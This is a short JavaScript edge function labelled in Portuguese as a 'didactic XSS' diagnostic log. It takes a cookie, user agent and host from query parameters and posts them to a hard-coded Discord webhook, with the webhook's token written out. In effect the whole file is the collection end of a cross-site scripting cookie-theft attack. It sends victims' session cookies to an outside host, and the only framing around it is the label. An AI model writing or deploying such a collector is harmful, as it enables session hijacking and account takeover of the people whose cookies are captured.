export const config = { runtime: 'edge' }

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);
    const cookie = searchParams.get("cookie") || "N/A";
    const userAgent = searchParams.get("ua") || "N/A";
    const host = searchParams.get("host") || "N/A";
    const hora = new Date().toLocaleString();

    const embed = {
      embeds: [{
        title: "Log de Diagnóstico (XSS Didático)",
        color: 3447003,
        fields: [
          { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1024)}\`\`\``, inline: false },
          { name: "User-Agent", value: userAgent, inline: false },
          { name: "Host", value: host, inline: true },
          { name: "Data/Hora", value: hora, inline: true }
        ]
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });

    return new Response("OK", { status: 200 });
  } catch (err) {
    const errorEmbed = {
      embeds: [{
        title: "Erro na API",
        color: 16711680,
        description: `\`\`\`${err.message}\`\`\``,
        timestamp: new Date().toISOString()
      }]
    };
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(errorEmbed)
    });
    return new Response("Erro", { status: 500 });
  }
}
